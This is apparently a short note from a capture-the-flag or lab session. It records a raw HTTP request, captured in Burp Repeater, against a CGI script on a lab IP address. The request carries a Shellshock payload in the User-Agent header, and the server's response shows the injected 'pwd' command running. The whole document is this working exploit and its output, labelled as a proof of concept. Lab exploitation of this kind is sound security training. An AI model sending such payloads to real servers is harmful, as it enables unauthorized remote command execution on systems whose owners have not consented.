
/cgi-bin/user.sh
repeater:
~~~
GET /cgi-bin/user.sh HTTP/1.1
Host: 10.129.243.115
Upgrade-Insecure-Requests: 1
User-Agent: () { :; }; echo; pwd
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close


~~~
proof of concept of shellshock vuln

~~~
HTTP/1.1 200 OK
Date: Thu, 28 Mar 2024 04:39:40 GMT
Server: Apache/2.4.18 (Ubuntu)
Connection: close
Content-Type: text/x-sh
Content-Length: 136

/usr/lib/cgi-bin

Content-Type: text/plain

Just an uptime test script

 00:39:40 up  3:44,  0 users,  load average: 0.00, 0.00, 0.00

~~~